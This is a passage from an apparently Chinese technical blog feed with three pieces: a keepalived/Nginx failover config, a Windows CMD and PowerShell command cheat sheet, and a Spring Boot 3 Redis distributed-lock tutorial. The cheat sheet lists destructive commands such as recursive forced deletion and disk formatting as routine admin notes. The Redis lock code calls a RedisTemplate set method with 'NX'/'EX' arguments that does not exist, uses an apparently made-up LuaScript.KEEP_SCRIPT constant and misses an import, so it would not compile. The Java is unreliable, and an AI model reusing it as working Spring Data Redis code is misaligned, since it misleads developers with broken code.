<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">! Configuration File for keepalived</span><br><span class="line"></span><br><span class="line">vrrp_script check_nginx &#123;     #脚本模块</span><br><span class="line">    script  &quot;/etc/keepalived/check_nginx.sh&quot;    #脚本路径</span><br><span class="line">interval 2    #检测脚本时间2秒</span><br><span class="line">weight 10    #优先级</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">global_defs &#123;</span><br><span class="line">  router_id slave-ip</span><br><span class="line">   vrrp_skip_check_adv_addr</span><br><span class="line">   script_user root</span><br><span class="line">   enable_script_security</span><br><span class="line"></span><br><span class="line">   vrrp_strict</span><br><span class="line">   vrrp_garp_interval 0</span><br><span class="line">   vrrp_gna_interval 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vrrp_instance VI_1 &#123;</span><br><span class="line">    state BACKUP</span><br><span class="line">    interface ens33</span><br><span class="line">    virtual_router_id 51</span><br><span class="line">    priority 99</span><br><span class="line">    advert_int 1</span><br><span class="line">    authentication &#123;</span><br><span class="line">        auth_type PASS</span><br><span class="line">        auth_pass 1111</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    track_script &#123;</span><br><span class="line">        check_nginx</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    virtual_ipaddress &#123;</span><br><span class="line">        192.168.133.130</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="启动keepalived"><a href="#启动keepalived" class="headerlink" title="启动keepalived"></a>启动keepalived</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start keepalived</span><br></pre></td></tr></table></figure>
<p>启动完成不报错即可,验证是否绑定虚拟ip,通过命令 ip as 查看</p>
]]></content>
      <categories>
        <category>运维技术</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Window笔记</title>
    <url>/cnblogs.github.io/2025/01/11/operations/window/Window%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="CMD常用命令详解"><a href="#CMD常用命令详解" class="headerlink" title="CMD常用命令详解"></a>CMD常用命令详解</h3><h4 id="查看和切换目录"><a href="#查看和切换目录" class="headerlink" title="查看和切换目录"></a>查看和切换目录</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd               # 查看当前目录</span><br><span class="line">cd 目录名        # 进入指定目录</span><br><span class="line">cd ..            # 返回上一级</span><br><span class="line">cd /d D:\目录    # 切换盘符和目录</span><br><span class="line">dir              # 列出当前目录内容</span><br></pre></td></tr></table></figure>
<h4 id="文件-文件夹操作"><a href="#文件-文件夹操作" class="headerlink" title="文件&#x2F;文件夹操作"></a>文件&#x2F;文件夹操作</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">md 新建文件夹                   # 新建目录</span><br><span class="line">mkdir 新建文件夹                # 同上</span><br><span class="line">del 文件名                      # 删除文件</span><br><span class="line">del /f /q /s 文件名             # 强制/静默/递归删除</span><br><span class="line">rd /s /q 文件夹名               # 删除文件夹及内容</span><br><span class="line">copy 源文件 目标文件            # 复制文件</span><br><span class="line">xcopy 源 目标 /E /H /Y          # 复制文件夹（含子目录、隐藏文件、自动覆盖）</span><br><span class="line">move 源 目标                    # 移动（重命名）</span><br></pre></td></tr></table></figure>
<h4 id="查看-编辑文件"><a href="#查看-编辑文件" class="headerlink" title="查看&#x2F;编辑文件"></a>查看&#x2F;编辑文件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">type 文件名.txt                # 显示文本内容</span><br><span class="line">notepad 文件名.txt             # 用记事本打开</span><br><span class="line">more 文件名.txt                # 分页显示</span><br></pre></td></tr></table></figure>
<h4 id="系统管理与信息查看"><a href="#系统管理与信息查看" class="headerlink" title="系统管理与信息查看"></a>系统管理与信息查看</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systeminfo                         # 系统信息</span><br><span class="line">hostname                           # 查看机器名</span><br><span class="line">ver                                # 操作系统版本</span><br><span class="line">tasklist                           # 当前进程列表</span><br><span class="line">taskkill /PID 进程号 /F            # 结束进程</span><br><span class="line">wmic cpu get Name                  # CPU信息</span><br><span class="line">wmic memorychip get capacity       # 内存信息</span><br><span class="line">schtasks /query /fo LIST           # 查看计划任务</span><br><span class="line">set                                # 环境变量</span><br></pre></td></tr></table></figure>
<h4 id="磁盘和文件系统工具"><a href="#磁盘和文件系统工具" class="headerlink" title="磁盘和文件系统工具"></a>磁盘和文件系统工具</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chkdsk C:               # 检查磁盘</span><br><span class="line">diskpart                # 硬盘分区工具</span><br><span class="line">format D:               # 格式化磁盘</span><br><span class="line">vol                     # 显示卷标与序列号</span><br><span class="line">fsutil                  # 文件系统高级操作</span><br></pre></td></tr></table></figure>
<h4 id="网络操作与排查"><a href="#网络操作与排查" class="headerlink" title="网络操作与排查"></a>网络操作与排查</h4><h5 id="IP配置和查看本地网络状态"><a href="#IP配置和查看本地网络状态" class="headerlink" title="IP配置和查看本地网络状态"></a>IP配置和查看本地网络状态</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ipconfig                       # 查看本地IP、子网掩码、网关</span><br><span class="line">ipconfig /all                  # 适配器详细、MAC、DNS等</span><br><span class="line">ipconfig /release              # 释放当前IP</span><br><span class="line">ipconfig /renew                # 重新请求IP</span><br></pre></td></tr></table></figure>
<h5 id="网络连通性测试"><a href="#网络连通性测试" class="headerlink" title="网络连通性测试"></a>网络连通性测试</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping www.baidu.com             # 测和百度的网络是否通畅</span><br><span class="line">ping 192.168.1.1               # 路由器/网关连通</span><br><span class="line">ping 域名/IP -n 10             # 连续发10个包</span><br></pre></td></tr></table></figure>
<h5 id="路由追踪-故障定位"><a href="#路由追踪-故障定位" class="headerlink" title="路由追踪&amp;故障定位"></a>路由追踪&amp;故障定位</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tracert www.baidu.com          # 路径追踪</span><br><span class="line">tracert -d www.baidu.com       # 跳过DNS解析</span><br><span class="line">pathping www.baidu.com         # 跳点延时及丢包率分析</span><br></pre></td></tr></table></figure>
<h5 id="网络端口与连接监控"><a href="#网络端口与连接监控" class="headerlink" title="网络端口与连接监控"></a>网络端口与连接监控</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -an                    # 所有监听端口、连接</span><br><span class="line">netstat -ano                   # 再带上进程PID</span><br><span class="line">netstat -ab                    # 一个进程/应用占哪些端口</span><br></pre></td></tr></table></figure>
<h5 id="路由与-ARP"><a href="#路由与-ARP" class="headerlink" title="路由与 ARP"></a>路由与 ARP</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">route print                    # 显示路由表</span><br><span class="line">route add ...                  # 添加路由</span><br><span class="line">route delete ...               # 删除路由</span><br><span class="line">arp -a                         # 本机ARP缓存（IP-MAC地址映射）</span><br></pre></td></tr></table></figure>
<h5 id="DNS-解析工具"><a href="#DNS-解析工具" class="headerlink" title="DNS 解析工具"></a>DNS 解析工具</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nslookup 域名                  # 查询域名解析结果</span><br><span class="line">nslookup                       # 进入交互模式，能查A记录/MX等</span><br></pre></td></tr></table></figure>
<h5 id="Telnet-端口连通性测试"><a href="#Telnet-端口连通性测试" class="headerlink" title="Telnet 端口连通性测试"></a>Telnet 端口连通性测试</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">telnet 目标IP/域名 端口</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">例：telnet smtp.163.com 25      (测企业邮箱端口)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">例：telnet 192.168.1.100 3306   (测内网MySQL端口)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">例：telnet 10.0.0.8 3389        (测远程桌面端口)</span></span><br></pre></td></tr></table></figure>
<h5 id="网络驱动器和共享盘"><a href="#网络驱动器和共享盘" class="headerlink" title="网络驱动器和共享盘"></a>网络驱动器和共享盘</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net use                          # 查看网络映射驱动器</span><br></pre></td></tr></table></figure>
<h4 id="软件、-服务与进程管理"><a href="#软件、-服务与进程管理" class="headerlink" title="软件、 服务与进程管理"></a>软件、 服务与进程管理</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wmic product get name,version      # 已安装程序</span><br><span class="line">tasklist                           # 查看进程</span><br><span class="line">taskkill /im 进程名 /f             # 杀死进程</span><br><span class="line">sc query                           # 查看服务</span><br><span class="line">net start 服务名                   # 启动服务</span><br><span class="line">net stop 服务名                    # 停止服务</span><br><span class="line">start 程序名                       # 启动程序</span><br><span class="line">shutdown /s /f /t 0                # 立即关机</span><br><span class="line">shutdown /r /t 0                   # 立即重启</span><br></pre></td></tr></table></figure>
<h4 id="常用高级-PowerShell-命令"><a href="#常用高级-PowerShell-命令" class="headerlink" title="常用高级 PowerShell 命令"></a>常用高级 PowerShell 命令</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Get-ChildItem                   # 等价ls/dir</span><br><span class="line">Set-Location 路径               # 切换目录</span><br><span class="line">Copy-Item file1 file2           # 复制</span><br><span class="line">Move-Item file1 file2           # 移动/重命名</span><br><span class="line">Remove-Item filename            # 删除</span><br><span class="line">Get-Content filename            # 查看文件</span><br><span class="line">Start-Process 应用              # 启动程序</span><br><span class="line">Get-Process                     # 查看进程</span><br><span class="line">Stop-Process -Name xxxxx        # 结束进程</span><br><span class="line">Get-Service                     # 查看所有服务</span><br><span class="line">Restart-Service 服务名          # 重启服务</span><br></pre></td></tr></table></figure>
<h4 id="SCP从linux复制文件到本地桌面"><a href="#SCP从linux复制文件到本地桌面" class="headerlink" title="SCP从linux复制文件到本地桌面"></a>SCP从linux复制文件到本地桌面</h4><p>下载的文件输入scp root@服务器ip:文件绝对路径（如scp <a href="mailto:&#114;&#111;&#111;&#116;&#64;&#x31;&#57;&#50;&#46;&#x31;&#54;&#x38;&#46;&#56;&#46;&#x31;&#51;&#x32;">&#114;&#111;&#111;&#116;&#64;&#x31;&#57;&#50;&#46;&#x31;&#54;&#x38;&#46;&#56;&#46;&#x31;&#51;&#x32;</a>:&#x2F;root&#x2F;test002） .&#x2F;Desktop，然后回车输入服务器密码。上传本地桌面文件到服务器,输入scp Desk\文件路径 root@服务器ip:文件绝对路径（如scp Desktop\test003.txt <a href="mailto:&#x72;&#111;&#x6f;&#116;&#x40;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#56;&#46;&#x31;&#51;&#x32;">&#x72;&#111;&#x6f;&#116;&#x40;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#56;&#46;&#x31;&#51;&#x32;</a>:&#x2F;root&#x2F;） 然后回车输入服务器密码</p>
<h3 id="PowerShell实用命令"><a href="#PowerShell实用命令" class="headerlink" title="PowerShell实用命令"></a>PowerShell实用命令</h3><h4 id="系统信息相关"><a href="#系统信息相关" class="headerlink" title="系统信息相关"></a>系统信息相关</h4><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Get-ComputerInfo</td>
<td>查看主机详细信息</td>
</tr>
<tr>
<td>Get-Host</td>
<td>显示当前 PowerShell 主机版本</td>
</tr>
<tr>
<td>systeminfo</td>
<td>查看系统基本信息（CMD兼容）</td>
</tr>
<tr>
<td>Get-Uptime</td>
<td>查看系统运行时长</td>
</tr>
<tr>
<td>Get-WmiObject -Class Win32_OperatingSystem</td>
<td>查看系统版本和安装日期</td>
</tr>
</tbody></table>
<h4 id="文件与目录操作"><a href="#文件与目录操作" class="headerlink" title="文件与目录操作"></a>文件与目录操作</h4><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Get-ChildItem 或 ls</td>
<td>列出当前目录内容</td>
</tr>
<tr>
<td>cd &lt;路径&gt;</td>
<td>进入目录</td>
</tr>
<tr>
<td>Copy-Item A.txt B.txt</td>
<td>复制文件</td>
</tr>
<tr>
<td>Move-Item A.txt D:\</td>
<td>移动文件</td>
</tr>
<tr>
<td>Remove-Item A.txt</td>
<td>删除文件</td>
</tr>
<tr>
<td>New-Item -ItemType File test.txt</td>
<td>新建文件</td>
</tr>
<tr>
<td>New-Item -ItemType Directory MyFolder</td>
<td>新建目录</td>
</tr>
<tr>
<td>Clear-Content A.txt</td>
<td>清空文件内容</td>
</tr>
<tr>
<td>Get-Content A.txt</td>
<td>读取文件内容</td>
</tr>
<tr>
<td>Set-Content A.txt “Hello”</td>
<td>写入文本到文件</td>
</tr>
</tbody></table>
<h4 id="搜索与过滤"><a href="#搜索与过滤" class="headerlink" title="搜索与过滤"></a>搜索与过滤</h4><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Select-String -Path *.log -Pattern “error”</td>
<td>搜索日志中的关键词</td>
</tr>
<tr>
<td>&#96;Get-ChildItem -Recurse</td>
<td>Where-Object {$_.Name -like “2025”}&#96;</td>
</tr>
<tr>
<td>&#96;Get-Process</td>
<td>Sort-Object CPU -Descending</td>
</tr>
</tbody></table>
<h4 id="进程与服务管理"><a href="#进程与服务管理" class="headerlink" title="进程与服务管理"></a>进程与服务管理</h4><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Get-Process</td>
<td>查看当前运行进程</td>
</tr>
<tr>
<td>Stop-Process -Name notepad</td>
<td>结束指定进程</td>
</tr>
<tr>
<td>Start-Process notepad.exe</td>
<td>启动进程</td>
</tr>
<tr>
<td>Get-Service</td>
<td>查看系统服务</td>
</tr>
<tr>
<td>Start-Service wuauserv</td>
<td>启动服务</td>
</tr>
<tr>
<td>Stop-Service Spooler</td>
<td>停止服务</td>
</tr>
<tr>
<td>Restart-Service Spooler</td>
<td>重启服务</td>
</tr>
<tr>
<td>Set-Service -Name Spooler -StartupType Automatic</td>
<td>设置服务启动类型</td>
</tr>
</tbody></table>
<h4 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h4><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Test-Connection <a href="http://www.baidu.com/">www.baidu.com</a></td>
<td>测试网络连通性</td>
</tr>
<tr>
<td>Resolve-DnsName <a href="http://www.baidu.com/">www.baidu.com</a></td>
<td>DNS解析查询</td>
</tr>
<tr>
<td>Get-NetIPAddress</td>
<td>查看本机IP信息</td>
</tr>
<tr>
<td>Get-NetRoute</td>
<td>查看路由表</td>
</tr>
<tr>
<td>Get-NetTCPConnection</td>
<td>查看当前TCP连接</td>
</tr>
<tr>
<td>Get-NetAdapter</td>
<td>查看网卡信息</td>
</tr>
<tr>
<td>Restart-NetAdapter -Name “Ethernet”</td>
<td>重启网卡</td>
</tr>
<tr>
<td>netstat -an</td>
<td>端口监听状态（CMD兼容）</td>
</tr>
</tbody></table>
<h4 id="用户与权限"><a href="#用户与权限" class="headerlink" title="用户与权限"></a>用户与权限</h4><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Get-LocalUser</td>
<td>查看本地用户</td>
</tr>
<tr>
<td>New-LocalUser -Name user1 -Password (Read-Host -AsSecureString)</td>
<td>新建用户</td>
</tr>
<tr>
<td>Add-LocalGroupMember -Group Administrators -Member user1</td>
<td>添加用户到管理员组</td>
</tr>
<tr>
<td>Remove-LocalUser -Name user1</td>
<td>删除用户</td>
</tr>
</tbody></table>
<h4 id="安全与权限相关"><a href="#安全与权限相关" class="headerlink" title="安全与权限相关"></a>安全与权限相关</h4><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Get-Acl .\file.txt</td>
<td>查看权限</td>
</tr>
<tr>
<td>Set-Acl</td>
<td>设置文件或文件夹权限</td>
</tr>
<tr>
<td>Enable-PSRemoting -Force</td>
<td>启用远程管理功能</td>
</tr>
<tr>
<td>Set-ExecutionPolicy RemoteSigned</td>
<td>设置脚本执行权限</td>
</tr>
</tbody></table>
<h4 id="模块与软件包管理"><a href="#模块与软件包管理" class="headerlink" title="模块与软件包管理"></a>模块与软件包管理</h4><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Get-InstalledModule</td>
<td>查看已安装模块</td>
</tr>
<tr>
<td>Install-Module -Name Az</td>
<td>安装PowerShell模块</td>
</tr>
<tr>
<td>Import-Module Az</td>
<td>导入模块</td>
</tr>
<tr>
<td>Update-Module</td>
<td>更新模块</td>
</tr>
<tr>
<td>Uninstall-Module Az</td>
<td>卸载模块</td>
</tr>
</tbody></table>
<h4 id="计划任务与自动化"><a href="#计划任务与自动化" class="headerlink" title="计划任务与自动化"></a>计划任务与自动化</h4><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Get-ScheduledTask</td>
<td>查看所有计划任务</td>
</tr>
<tr>
<td>Register-ScheduledTask</td>
<td>注册新任务（较复杂）</td>
</tr>
<tr>
<td>schtasks &#x2F;create</td>
<td>使用命令创建任务（兼容CMD）</td>
</tr>
<tr>
<td>Start-ScheduledTask -TaskName “MyTask”</td>
<td>运行计划任务</td>
</tr>
<tr>
<td>Unregister-ScheduledTask -TaskName “MyTask” -Confirm:$false</td>
<td>删除任务</td>
</tr>
</tbody></table>
<h4 id="实用技巧与快捷命令"><a href="#实用技巧与快捷命令" class="headerlink" title="实用技巧与快捷命令"></a>实用技巧与快捷命令</h4><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Get-Command</td>
<td>查看所有命令</td>
</tr>
<tr>
<td>Get-Help Get-Process</td>
<td>查看命令帮助</td>
</tr>
<tr>
<td>Get-Help Get-Process -Examples</td>
<td>查看使用示例</td>
</tr>
<tr>
<td>Start-Sleep -Seconds 5</td>
<td>暂停脚本</td>
</tr>
<tr>
<td>Measure-Command {command}</td>
<td>统计命令执行时间</td>
</tr>
<tr>
<td>Out-File log.txt</td>
<td>将输出写入文件</td>
</tr>
</tbody></table>
<h3 id="软件推荐"><a href="#软件推荐" class="headerlink" title="软件推荐"></a>软件推荐</h3><p>硬件检测-Hwinfo   <a href="https://sourceforge.net/projects/hwinfo/">下载地址</a><br>SqlServer转Mysql工具-Mss2sql <a href="http://files.cnblogs.com/andrew-blog/mss2sql.rar">下载地址</a></p>
]]></content>
      <categories>
        <category>运维技术</category>
      </categories>
      <tags>
        <tag>Window</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot笔记</title>
    <url>/cnblogs.github.io/2025/01/18/backEnd/java/Spring%20Boot/SpringBoot%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="SpringBoot3"><a href="#SpringBoot3" class="headerlink" title="SpringBoot3"></a>SpringBoot3</h3><h4 id="【功能一】Redis-实现分布式锁"><a href="#【功能一】Redis-实现分布式锁" class="headerlink" title="【功能一】Redis 实现分布式锁"></a>【功能一】Redis 实现分布式锁</h4><p><strong>添加依赖</strong><br>在 Spring Boot 项目的 pom.xml 文件中，添加 Spring Data Redis 依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>配置 Redis 连接</strong><br>在 application.yml 文件中，配置 Redis 的连接信息，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring:</span><br><span class="line">  redis:</span><br><span class="line">    host: localhost</span><br><span class="line">    port: 6379</span><br><span class="line">    password: </span><br><span class="line">    database: 0</span><br></pre></td></tr></table></figure>
<p><strong>创建 Redis 配置类</strong><br>创建一个 Redis 配置类，用于配置 Redis 连接工厂等相关信息：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.connection.RedisConnectionFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.RedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.serializer.GenericJackson2JsonRedisSerializer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.serializer.StringRedisSerializer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RedisTemplate&lt;String, Object&gt; <span class="title function_">redisTemplate</span><span class="params">(RedisConnectionFactory redisConnectionFactory)</span> &#123;</span><br><span class="line">        RedisTemplate&lt;String, Object&gt; redisTemplate = <span class="keyword">new</span> <span class="title class_">RedisTemplate</span>&lt;&gt;();</span><br><span class="line">        redisTemplate.setConnectionFactory(redisConnectionFactory);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置key的序列化方式</span></span><br><span class="line">        redisTemplate.setKeySerializer(<span class="keyword">new</span> <span class="title class_">StringRedisSerializer</span>());</span><br><span class="line">        <span class="comment">// 设置value的序列化方式</span></span><br><span class="line">        redisTemplate.setValueSerializer(<span class="keyword">new</span> <span class="title class_">GenericJackson2JsonRedisSerializer</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>创建 RedisLock 类</strong><br>创建一个 RedisLock 类，用于实现获取锁和释放锁的逻辑：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.RedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.StringUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisLock</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LOCK_SUCCESS</span> <span class="operator">=</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SET_IF_NOT_EXIST</span> <span class="operator">=</span> <span class="string">&quot;NX&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SET_WITH_EXPIRE_TIME</span> <span class="operator">=</span> <span class="string">&quot;EX&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">RELEASE_SUCCESS</span> <span class="operator">=</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String RELEASE_LUA;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        sb.append(<span class="string">&quot;if redis.call(\&quot;get\&quot;,KEYS[1]) == ARGV[1] &quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;then &quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;    return redis.call(\&quot;del\&quot;,KEYS[1]) &quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;else &quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;    return 0 &quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;end &quot;</span>);</span><br><span class="line">        RELEASE_LUA = sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String clientId;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RedisLock</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.clientId = UUID.randomUUID().toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取锁</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">tryLock</span><span class="params">(String key, <span class="type">long</span> timeout, TimeUnit unit)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> redisTemplate.opsForValue().set(key, clientId, timeout, unit, SET_IF_NOT_EXIST, SET_WITH_EXPIRE_TIME);</span><br><span class="line">        <span class="keyword">return</span> LOCK_SUCCESS.equals(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放锁</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">releaseLock</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> redisTemplate.execute(</span><br><span class="line">                (connection) -&gt; connection.eval(</span><br><span class="line">                        RELEASE_LUA.getBytes(),</span><br><span class="line">                        org.springframework.data.redis.connection.RedisStringCommands.LuaScript.KEEP_SCRIPT,</span><br><span class="line">                        <span class="number">1</span>,</span><br><span class="line">                        key.getBytes(),</span><br><span class="line">                        clientId.getBytes()</span><br><span class="line">                )</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> RELEASE_SUCCESS.equals(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>使用 RedisLock</strong><br>在业务代码中，使用 RedisLock 来获取锁和释放锁：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RedisLock redisLock;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LOCK_KEY</span> <span class="operator">=</span> <span class="string">&quot;test_lock&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">locked</span> <span class="operator">=</span> redisLock.tryLock(LOCK_KEY, <span class="number">10</span>, TimeUnit.SECONDS);</span><br><span class="line">        <span class="keyword">if</span> (locked) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 执行业务逻辑</span></span><br><span class="line">                Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;业务逻辑执行完成，锁已释放&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                redisLock.releaseLock(LOCK_KEY);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;获取锁失败，请稍后重试&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;操作异常&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="【功能二】自定义配置文件"><a href="#【功能二】自定义配置文件" class="headerlink" title="【功能二】自定义配置文件"></a>【功能二】自定义配置文件</h4><p><strong>在默认配置文件中自定义属性</strong><br>Spring Boot 3 默认会读取 application.properties 或 application.yml 这两个配置文件。其中，application.yml 因其简洁易读的格式，近年来越来越受开发者青睐。我们先来看在 application.ym 中自定义属性的方法。假设我们要定义一组与用户相关的自定义属性，可以这样编写：</p>
